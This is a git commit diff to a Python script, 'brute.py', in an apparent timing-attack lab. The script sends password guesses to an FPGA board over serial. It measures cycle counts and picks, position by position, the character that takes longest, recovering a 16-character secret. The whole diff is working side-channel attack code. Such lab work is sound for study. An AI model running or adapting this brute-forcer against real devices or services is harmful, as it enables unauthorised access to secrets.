f7b43f94005d969f351802dc5a89c8234a9a6cdc
froncek <58497711+froncek@users.noreply.github.com>
2019-12-04 16:08:06 -0800

    saving changes

--- timing_attack2/python/brute.py
+++ timing_attack2/python/brute.py
@@ -7,23 +7,32 @@ from time import sleep
 import binascii
 import struct
 import json
-import pandas
+# import pandas
+import operator
+
+def greater_element(d):
+    return max(d,key=d.get)
 
 # Open serial device. Set a timeout so reads return after 2 seconds
 with Serial('/dev/ttyUSB.arty.UART', timeout=60) as dev:
     dev.baudrate = 115200
 
-    data = dict()
-    found = b""
-    for c in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
-        dev.write(b"@")
+    
+    found = b""    
+    for x in range(16):
 
-        attempt = b"".join([found,bytes(c,'utf-8'), b"A" * (15 - len(found))])
-        print(f"Attempt:{attempt}")
-        dev.write( attempt )
-        cycles = struct.unpack("<I",dev.read(4))[0]
+        data = dict()
+        for c in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz':
+            dev.write(b"@")
+
+            sleep(0.5)                                                                                                                                                   
+            attempt = b"".join([found,bytes(c,'utf-8'), b"A" * (15 - len(found))])
+            print(f"Attempt:{attempt}")
+            dev.write( attempt )
+            cycles = struct.unpack("<I",dev.read(4))[0]
+            
+            print(cycles)        
+            data[c] = cycles
         
-        print(cycles)        
-        data[c] = cycles
-
-    print(json.dumps(data))
+        print(data)
+        found = b"".join([found, greater_element(data).encode()])
